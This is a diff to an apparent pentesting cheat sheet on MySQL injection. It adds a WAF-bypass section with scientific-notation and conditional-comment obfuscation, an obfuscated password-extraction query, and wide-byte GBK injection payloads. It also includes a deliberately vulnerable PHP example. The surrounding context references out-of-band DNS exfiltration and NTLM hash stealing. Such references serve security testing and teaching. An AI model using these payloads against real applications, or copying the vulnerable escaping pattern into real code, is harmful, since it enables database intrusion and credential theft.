@@ -1,4 +1,4 @@
-# MYSQL Injection
+# MySQL Injection
 
 ## Summary
 
@@ -33,6 +33,12 @@
 * [MYSQL Out of band](#mysql-out-of-band)
     * [DNS exfiltration](#dns-exfiltration)
     * [UNC Path - NTLM hash stealing](#unc-path---ntlm-hash-stealing)
+* [MYSQL WAF Bypass](#mysql-waf-bypass)
+    * [Alternative to information schema](#alternative-to-information-schema)
+    * [Alternative to version](#alternative-to-version)
+    * [Scientific Notation](#scientific-notation)
+    * [Conditional Comments](#conditional-comments)
+    * [Wide byte injection](#wide-byte-injection)
 * [References](#references)
 
 
@@ -433,6 +439,7 @@ make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(51
 (select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)
 ```
 
+
 ## MYSQL Current queries
 
 This table can list all operations that DB is performing at the moment.
@@ -549,6 +556,134 @@ select 'osanda' into outfile '\\\\error\\abc';
 load data infile '\\\\error\\abc' into table database.table_name;
 ```
 
+
+## MYSQL WAF Bypass
+
+### Alternative to information schema
+
+`information_schema.tables` alternative
+
+```sql
+select * from mysql.innodb_table_stats;
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
+| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
+...
++----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
+
+mysql> show tables in dvwa;
++----------------+
+| Tables_in_dvwa |
++----------------+
+| guestbook      |
+| users          |
++----------------+
+```
+
+
+### Alternative to version
+
+```sql
+mysql> select @@innodb_version;
++------------------+
+| @@innodb_version |
++------------------+
+| 5.6.31           |
++------------------+
+
+mysql> select @@version;
++-------------------------+
+| @@version               |
++-------------------------+
+| 5.6.31-0ubuntu0.15.10.1 |
++-------------------------+
+
+mysql> mysql> select version();
++-------------------------+
+| version()               |
++-------------------------+
+| 5.6.31-0ubuntu0.15.10.1 |
++-------------------------+
+```
+
+
+### Scientific Notation
+
+In MySQL, the e notation is used to represent numbers in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists of a number followed by the letter e and an exponent.
+The format is: `base 'e' exponent`.
+
+For example: 
+* `1e3` represents `1 x 10^3` which is `1000`. 
+* `1.5e3` represents `1.5 x 10^3` which is `1500`. 
+* `2e-3` represents `2 x 10^-3` which is `0.002`. 
+
+The following queries are equivalent: 
+* `SELECT table_name FROM information_schema 1.e.tables` 
+* `SELECT table_name FROM information_schema .tables` 
+
+In the same way, the common payload to bypass authentication `' or ''='` is equivalent to `' or 1.e('')='` and `1' or 1.e(1) or '1'='1`. 
+This technique can be used to obfuscate queries to bypass WAF, for example: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2` 
+
+
+### Conditional Comments
+
+* `/*! ... */`: This is a conditional MySQL comment. The code inside this comment will be executed only if the MySQL version is greater than or equal to the number immediately following the `/*!`. If the MySQL version is less than the specified number, the code inside the comment will be ignored. 
+    * `/*!12345UNION*/`: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.
+    * `/*!31337SELECT*/`: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher.
+Examples: `/*!12345UNION*/`, `/*!31337SELECT*/`
+
+
+### Wide byte injection
+
+Wide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term "wide byte" refers to character encodings where one character can be represented by more than one byte. This type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.
+
+The `SET NAMES gbk` query can be exploited in a charset-based SQL injection attack. When the character set is set to GBK, certain multibyte characters can be used to bypass the escaping mechanism and inject malicious SQL code.
+
+Several characters can be used to triger the injection.
+
+* `%bf%27`: This is a URL-encoded representation of the byte sequence `0xbf27`. In the GBK character set, `0xbf27` decodes to a valid multibyte character followed by a single quote ('). When MySQL encounters this sequence, it interprets it as a single valid GBK character followed by a single quote, effectively ending the string.
+* `%bf%5c`: Represents the byte sequence `0xbf5c`. In GBK, this decodes to a valid multi-byte character followed by a backslash (`\`). This can be used to escape the next character in the sequence.
+* `%a1%27`: Represents the byte sequence `0xa127`. In GBK, this decodes to a valid multi-byte character followed by a single quote (`'`).
+
+A lot of payloads can be created such as:
+
+```
+%A8%27 OR 1=1;--
+%8C%A8%27 OR 1=1--
+%bf' OR 1=1 -- --
+```
+
+Here is a PHP example using GBK encoding and filtering the user input to escape backslash, single and double quote.
+
+```php
+function check_addslashes($string)
+{
+    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
+    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
+    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
+      
+    return $string;
+}
+
+$id=check_addslashes($_GET['id']);
+mysql_query("SET NAMES gbk");
+$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
+print_r(mysql_error());
+```
+
+Here's a breakdown of how the wide byte injection works:
+
+For instance, if the input is `?id=1'`, PHP will add a backslash, resulting in the SQL query: `SELECT * FROM users WHERE id='1\'' LIMIT 0,1`.
+
+However, when the sequence `%df` is introduced before the single quote, as in `?id=1%df'`, PHP still adds the backslash. This results in the SQL query: `SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1`. 
+
+In the GBK character set, the sequence `%df%5c` translates to the character `連`. So, the SQL query becomes: `SELECT * FROM users WHERE id='1連'' LIMIT 0,1`. Here, the wide byte character `連` effectively "eating" the added escape charactr, allowing for SQL injection.
+
+Therefore, by using the payload `?id=1%df' and 1=1 --+`, after PHP adds the backslash, the SQL query transforms into: `SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`. This altered query can be successfully injected, bypassing the intended SQL logic.
+
+
 ## References
 
 - [MySQL Out of Band Hacking - @OsandaMalith](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
@@ -559,3 +694,5 @@ load data infile '\\\\error\\abc' into table database.table_name;
 - [SQL Wiki - netspi](https://sqlwiki.netspi.com/injectionTypes/errorBased)
 - [ekoparty web_100 - 2016/10/26 - p4-team](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)
 - [Websec - MySQL - Roberto Salgado - May 29, 2013.](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)
+- [A Scientific Notation Bug in MySQL left AWS WAF Clients Vulnerable to SQL Injection - Marc Olivier Bergeron - Oct 19, 2021](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
+- [How to Use SQL Calls to Secure Your Web Site - IT SECURITY CENTER (ISEC) INFORMATION-TECHNOLOGY PROMOTION AGENCY](https://www.ipa.go.jp/security/vuln/ps6vr70000011hc4-att/000017321.pdf)
